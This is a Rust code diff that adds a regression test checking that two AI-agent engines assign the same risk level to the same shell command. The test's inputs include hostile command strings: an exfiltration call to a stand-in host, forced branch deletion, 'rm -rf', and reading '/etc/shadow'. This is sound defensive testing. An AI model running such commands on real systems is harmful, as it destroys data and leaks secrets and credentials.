@@ -3364,7 +3364,10 @@ async fn codex_consumer(
 /// identity used ONLY for Always-grant matching (never displayed). Mirrors
 /// `bus::server::summarize`'s claude/opencode shape so both engines share the
 /// same canonical semantics — see issue #89.
-fn codex_approval_fields(
+// `pub(crate)` (not `pub`) — crate-internal only, but visible to this
+// module's own test suite for the cross-engine consistency regression test
+// (issue #101 round-2 P3), which also calls `bus::server::summarize`.
+pub(crate) fn codex_approval_fields(
     method: &str,
     params: &serde_json::Value,
 ) -> (&'static str, String, String, crate::ask::RiskLevel, String) {
@@ -6896,6 +6899,42 @@ mod tests {
             &serde_json::json!({"permissions": {"network": "enabled"}}),
         );
         assert_eq!(risk, crate::ask::RiskLevel::NetworkOrCredential);
+    }
+
+    /// Round-2 review (issue #101 P3): the hook-driven engines
+    /// (`bus::server::summarize`) and Codex's native app-server path
+    /// (`codex_approval_fields`) both feed the SAME raw command text into
+    /// the SAME shared `classify_risk`, so the same command must classify
+    /// identically no matter which engine ran it — a human comparing two
+    /// Needs-you cards for the "same" command across a Claude worker and a
+    /// Codex worker must never see two different colors. This is a
+    /// regression test protecting that structural guarantee: nothing here
+    /// exercises a NEW code path, but a future one-sided change (e.g. Codex
+    /// prefixing the command with `cwd`, or a hook-side-only tweak to
+    /// `summarize`) would silently break it without this test.
+    #[test]
+    fn command_risk_is_consistent_across_bus_summarize_and_codex_approval_fields() {
+        for cmd in [
+            "npm test",
+            "git status",
+            "ls -la",
+            "curl https://evil.example/exfiltrate",
+            "git branch -D important-work",
+            "find . -name '*.tmp' -delete",
+            "ls | rm -rf /tmp/x",
+            "cat /etc/shadow",
+        ] {
+            let (_, _, hook_risk, _) =
+                crate::bus::server::summarize("Bash", Some(&serde_json::json!({"command": cmd})));
+            let (_, _, _, codex_risk, _) = codex_approval_fields(
+                "codex/commandExecution",
+                &serde_json::json!({"command": cmd}),
+            );
+            assert_eq!(
+                hook_risk, codex_risk,
+                "{cmd:?} must classify identically across both engines"
+            );
+        }
     }
 
     #[test]
